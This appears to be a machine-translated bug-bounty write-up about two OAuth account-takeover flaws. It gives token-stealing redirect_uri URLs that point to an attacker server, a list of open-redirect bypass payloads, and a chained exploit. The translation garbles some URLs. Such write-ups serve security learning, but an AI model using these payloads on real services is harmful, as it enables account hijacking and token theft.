<html>
<head>
<title>Exploiting misconfigured OAuth to takeover accounts</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">利用错误配置的OAuth接管帐户</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/exploiting-misconfigured-oauth-to-takeover-accounts-225a367bca43?source=collection_archive---------0-----------------------#2021-03-30">https://infosecwriteups.com/exploiting-misconfigured-oauth-to-takeover-accounts-225a367bca43?source=collection_archive---------0-----------------------#2021-03-30</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="2238" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">嗨，在这篇文章中，我将讨论我在查找bug时发现的两个错误配置的OAuth缺陷，废话不多说，让我们开始吧。</p><p id="7622" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> 1)没有验证redirect_uri参数</strong></p><p id="bae5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在浏览应用程序时，我注意到用户可以选择将他们的社交媒体帐户连接到应用程序，这显然是使用OAuth完成的。</p><p id="b7ad" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我开始寻找OAuth实现中的bug，很快发现<code class="fe kl km kn ko b">state</code>参数不见了。</p><p id="9d2e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">对于那些不知道<code class="fe kl km kn ko b">state</code>参数的人来说，可以把它想象成一个防止CSRF攻击的CSRF令牌。</p><p id="e153" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在OAuth的情况下，缺少<code class="fe kl km kn ko b">state</code>参数可能会导致帐户被接管。它使攻击者能够在应用程序上将他的社交媒体帐户连接到受害者的帐户，并最终接管他的帐户。</p><p id="91f6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果您不熟悉OAuth flow，我强烈建议您先了解一下。</p><figure class="kq kr ks kt gt ku gh gi paragraph-image"><div role="button" tabindex="0" class="kv kw di kx bf ky"><div class="gh gi kp"><img src="../Images/084f05dfe6fbf5e06802bca858d1ce18.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*XVA6MV-nQ0pEeq6ceoA-XQ.png"/></div></div><figcaption class="lb lc gj gh gi ld le bd b be z dk translated">来源:PortSwigger</figcaption></figure><blockquote class="lf lg lh"><p id="8ffe" class="jn jo li jp b jq jr js jt ju jv jw jx lj jz ka kb lk kd ke kf ll kh ki kj kk ij bi translated">攻击场景</p><p id="8567" class="jn jo li jp b jq jr js jt ju jv jw jx lj jz ka kb lk kd ke kf ll kh ki kj kk ij bi translated">1.攻击者在此应用程序上创建一个帐户，并通过连接其社交媒体帐户启动OAuth流。</p><p id="cda1" class="jn jo li jp b jq jr js jt ju jv jw jx lj jz ka kb lk kd ke kf ll kh ki kj kk ij bi translated">2.他允许OAuth提供者与客户机应用程序共享数据。</p><p id="4263" class="jn jo li jp b jq jr js jt ju jv jw jx lj jz ka kb lk kd ke kf ll kh ki kj kk ij bi translated">3.OAuth提供者用包含代码的重定向进行响应。</p><p id="4e70" class="jn jo li jp b jq jr js jt ju jv jw jx lj jz ka kb lk kd ke kf ll kh ki kj kk ij bi translated">4.攻击者没有使用此代码来链接其社交媒体帐户，而是保存它并将带有代码的链接发送给受害者，或者在网站上嵌入iframe并将链接发送给受害者。(请看流程中的第三步，一个带有代码的请求被发送到回调端点)</p><p id="a3d8" class="jn jo li jp b jq jr js jt ju jv jw jx lj jz ka kb lk kd ke kf ll kh ki kj kk ij bi translated">5.当受害者访问该网站时，攻击者的社交媒体帐户与受害者在客户端应用程序上的帐户相链接。</p><p id="b855" class="jn jo li jp b jq jr js jt ju jv jw jx lj jz ka kb lk kd ke kf ll kh ki kj kk ij bi translated">6.攻击者可以使用受害者链接的社交媒体帐户登录受害者的帐户，然后更改电子邮件或做他想做的任何事情。</p></blockquote><p id="0850" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我在burp中查看了请求的历史记录，结果发现客户端应用程序在请求中发送了一个带有令牌的自定义auth头，其中包含链接社交媒体帐户的代码，这使得它无法被CSRF攻击利用。</p><pre class="kq kr ks kt gt lm ko ln lo aw lp bi"><span id="ceed" class="lq lr iq ko b gy ls lt l lu lv">X-AUTH: 12345678909876543210</span></pre><p id="7cc6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我寻找了所有不同社交媒体提供商的OAuth实现，它们都是一样的，它没有使用<code class="fe kl km kn ko b">state</code>参数，但连接帐户的最终请求有一个自定义的Auth头，带有一个防止CSRF攻击的令牌。</p><p id="48cd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我从我的帐户注销，它将我重定向到登录页面，在那里我注意到用XYZ按钮登录，我检查了OAuth提供者之一上的OAuth实现，它被正确配置。我检查了另一个，它有一个不同的实现。它会向<code class="fe kl km kn ko b">api</code>端点(在客户端应用程序上)发送一个请求以及一个<code class="fe kl km kn ko b"><em class="li">redirect_uri</em></code> <em class="li"> </em>参数，然后使用这个<code class="fe kl km kn ko b">redirect_uri</code>来启动OAuth流。</p><p id="d79e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><a class="ae lw" href="https://client-app.com/api?redirect_uri=https://client-app.com/login" rel="noopener ugc nofollow" target="_blank">https://client-app.com/api/oauth-provider?redirect _ uri = https://client-app . com/log in</a></p><p id="0bbd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">向<code class="fe kl km kn ko b">redirect_uri</code>提供任意域名似乎有效。</p><p id="7865" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><a class="ae lw" href="https://client-app.com/api/oauth-provider?redirect_uri=https://attacker.com" rel="noopener ugc nofollow" target="_blank">https://client-app.com/api/oauth-provider?redirect _ uri = https://attack . com</a>/</p><p id="2527" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我登录我的VPS并运行python的<code class="fe kl km kn ko b"><em class="li">SimpleHTTPServer</em></code> <em class="li"> </em>来检查<em class="li"> </em> <code class="fe kl km kn ko b"><em class="li">redirect_uri</em></code>参数是否可以被利用来窃取令牌</p><pre class="kq kr ks kt gt lm ko ln lo aw lp bi"><span id="aa2f" class="lq lr iq ko b gy ls lt l lu lv">python -m SimpleHTTPServer 8080</span></pre><p id="df1a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在python 3中，这将是</p><pre class="kq kr ks kt gt lm ko ln lo aw lp bi"><span id="8009" class="lq lr iq ko b gy ls lt l lu lv">python3 -m http.server 8080</span></pre><p id="c344" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我提供了我的VPS的IP和令牌显示在日志中</p><p id="3335" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><a class="ae lw" href="https://client-app.com/api?redirect_uri=http://123.123.123.123:8080/" rel="noopener ugc nofollow" target="_blank">https://client-app.com/api/</a>T19】oauth-providerT21？redirect _ uri = http://123 . 123 . 123 . 123:8080/</p><p id="b927" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我试着用这个偷来的令牌登录，成功了！我登录了受害者的账户。</p><p id="d7c7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><a class="ae lw" href="https://client-app.com/login/{token}" rel="noopener ugc nofollow" target="_blank">https://client-app.com/login/{token}</a></p><p id="0d65" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果你没有VPS或任何网站来记录进入的流量，你可以简单地使用<a class="ae lw" href="https://requestbin.com/" rel="noopener ugc nofollow" target="_blank">requestbin.com</a>来实现这些目的。</p><p id="6ff1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">需要注意的事项:</p><ol class=""><li id="31c2" class="lx ly iq jp b jq jr ju jv jy lz kc ma kg mb kk mc md me mf bi translated">没有对<code class="fe kl km kn ko b">redirect_uri</code>参数的服务器端验证。</li><li id="2c79" class="lx ly iq jp b jq mg ju mh jy mi kc mj kg mk kk mc md me mf bi translated">只有当受害者与OAuth提供者有一个活动的会话，并且已经将他的帐户与他们链接时，这才会起作用。</li></ol><p id="65f9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> 2)利用开放重定向漏洞窃取令牌</strong></p><p id="f4ab" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是在另一个应用程序上，我在寻找OAuth实现中的错误。在测试中，<code class="fe kl km kn ko b"><em class="li">state</em></code>参数，<code class="fe kl km kn ko b"><em class="li">redirect_uri</em></code>验证和一切似乎都没问题。</p><p id="632f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在这个应用程序上花了一些时间并浏览了其他功能后，我发现了一个引起我注意的端点，因为它有<code class="fe kl km kn ko b">r_url</code>(重定向)参数</p><p id="8625" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">https://example.com/endpoint/r_url/{domain</p><p id="6a7e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">向<code class="fe kl km kn ko b">r_url</code>供应<a class="ae lw" href="https://google.com" rel="noopener ugc nofollow" target="_blank">google.com</a></p><p id="b0c3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><a class="ae lw" href="https://example.com/endpointr_url/google.com" rel="noopener ugc nofollow" target="_blank">https://example.com/endpointr_url/google.com</a>将重定向至google.com</p><p id="f340" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我试图供应attacker.com，以检查它是否重定向到attacker.com，但它没有工作。</p><p id="e781" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><a class="ae lw" href="https://example.com/endpoint/r_url/attacker.com" rel="noopener ugc nofollow" target="_blank">https://example.com/endpoint/r_url/attacker.com</a></p><p id="88b6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我试着给example.com供货</p><p id="c57c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">https://example.com/endpoint/r_url/example.com成功了。它允许google.com，但不允许attacker.com</p><p id="d627" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我尝试了各种技术来绕过<code class="fe kl km kn ko b">r_url</code>的验证</p><pre class="kq kr ks kt gt lm ko ln lo aw lp bi"><span id="c76a" class="lq lr iq ko b gy ls lt l lu lv"><a class="ae lw" href="https://example.com/endpoint?r_url=" rel="noopener ugc nofollow" target="_blank">https://example.com/endpoint/r_url</a>//attacker.com</span><span id="1784" class="lq lr iq ko b gy ml lt l lu lv">Didn’t work.</span><span id="a215" class="lq lr iq ko b gy ml lt l lu lv"><a class="ae lw" href="https://example.com/endpoint/r_url/attacker.com" rel="noopener ugc nofollow" target="_blank">https://example.com/endpoint/r_url\/attacker.com</a></span><span id="ae4b" class="lq lr iq ko b gy ml lt l lu lv">Didn’t work.</span><span id="15f0" class="lq lr iq ko b gy ml lt l lu lv"><a class="ae lw" href="https://example.com/endpoint/r_url/attacker.com" rel="noopener ugc nofollow" target="_blank">https://example.com/endpoint/r_url\/\/attacker.com</a></span><span id="bfa3" class="lq lr iq ko b gy ml lt l lu lv">Didn’t work.</span><span id="45e5" class="lq lr iq ko b gy ml lt l lu lv"><a class="ae lw" href="https://example.com/endpoint/r_url/attacker.com" rel="noopener ugc nofollow" target="_blank">https://example.com/endpoint/r_url\\attacker.com</a></span><span id="471c" class="lq lr iq ko b gy ml lt l lu lv">Didn’t work.</span><span id="e894" class="lq lr iq ko b gy ml lt l lu lv"><a class="ae lw" href="https://example.com/endpoint/r_url/attacker.com" rel="noopener ugc nofollow" target="_blank">https://example.com/endpoint/r_url/\/attacker.com</a></span><span id="fe12" class="lq lr iq ko b gy ml lt l lu lv">Didn’t work.</span><span id="4915" class="lq lr iq ko b gy ml lt l lu lv"><a class="ae lw" href="https://example.com/endpoint/r_url/example.com.attacker.com" rel="noopener ugc nofollow" target="_blank">https://example.com/endpoint/r_url/example.com.attacker.com</a></span><span id="16a0" class="lq lr iq ko b gy ml lt l lu lv">Didn’t work.</span><span id="ae51" class="lq lr iq ko b gy ml lt l lu lv"><a class="ae lw" href="https://example.com/endpoint/r_url/notexample.com" rel="noopener ugc nofollow" target="_blank">https://example.com/endpoint/r_url/notexample.com</a></span><span id="f7ed" class="lq lr iq ko b gy ml lt l lu lv">Didn’t work.</span><span id="67b5" class="lq lr iq ko b gy ml lt l lu lv"><a class="ae lw" href="https://example.com/endpoint/r_url/example.com@attacker.com" rel="noopener ugc nofollow" target="_blank">https://example.com/endpoint/r_url/example.com@attacker.com</a></span><span id="dcba" class="lq lr iq ko b gy ml lt l lu lv">This one worked and I was redirected to attacker.com.</span></pre><p id="c0bb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在大多数人犯的错误是他们发现开放重定向并试图报告它(大多数程序甚至不考虑它们),而不是报告开放重定向，在某个地方记下它并寻找链接它的方法。</p><p id="12b4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我回去测试OAuth实现，它发送了一个请求，看起来像这样</p><p id="d29b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><a class="ae lw" href="https://oauth-provider.com/login?client_id=12345678&amp;redirect_uri=https://example.com" rel="noopener ugc nofollow" target="_blank">https://oauth-provider.com/login?client_id=12345678&amp;重定向_uri=https://example.com </a></p><p id="73b5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">正如我之前测试的那样，我知道它已经正确配置并且<code class="fe kl km kn ko b">redirect_uri</code>不能被绕过，但是如果我们重定向到重定向到攻击者的域的同一应用程序上的页面呢？</p><p id="b628" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这个想法是利用新发现的开放重定向漏洞，将受害者重定向到攻击者控制的域。</p><p id="e9ed" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我试过这个。</p><p id="0999" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><a class="ae lw" href="https://oauth-provider.com/login?client_id=12345678&amp;redirect_uri=https://example.com/endpoint/r_url/example.com@attacker.com" rel="noopener ugc nofollow" target="_blank">https://oauth-provider.com/login?client_id=12345678&amp;redirect _ uri = https://example . com/endpoint/r _ URL/example . com @ attack . com</a></p><p id="5c2a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">但是没有用。</p><p id="a194" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">编码<code class="fe kl km kn ko b">redirect_uri</code>参数值的URL</p><p id="2bd8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">【https://oauth-provider.com/login?client_id=12345678&amp;T2 redirect _ uri = https % 3A % 2F % 2f example . com % 2f endpoint % 2Fr _ URL % 2f example . com % 40 attack . com</p><p id="de68" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">而且成功了。</p><p id="3957" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我用google dork又找到了一个带<code class="fe kl km kn ko b">r_url</code>的端点，这个也帮我链接了。</p><pre class="kq kr ks kt gt lm ko ln lo aw lp bi"><span id="7c22" class="lq lr iq ko b gy ls lt l lu lv">site:program.com inurl:r_url</span></pre><p id="7a19" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">(提示:谷歌是你最好的朋友，明智地使用它来寻找有趣的端点/参数)</p><p id="4bdb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是可能的，因为<code class="fe kl km kn ko b">redirect_uri</code>被配置为允许<strong class="jp ir">* . example . com/*</strong>(example.com上的任何页面或其子域名)</p><p id="c839" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在这种情况下，开放重定向缺陷有点像帮助攻击者窃取令牌的中介或代理。</p><p id="e816" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我检查了传入流量日志，发现令牌耐心地等待着我。</p><p id="0835" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我希望你喜欢读这篇文章，如果你有任何问题，请随时在Twitter @ <a class="ae lw" href="https://twitter.com/0xAkash" rel="noopener ugc nofollow" target="_blank"> 0xAkash </a>上给我发信息。</p></div></div>    
</body>
</html>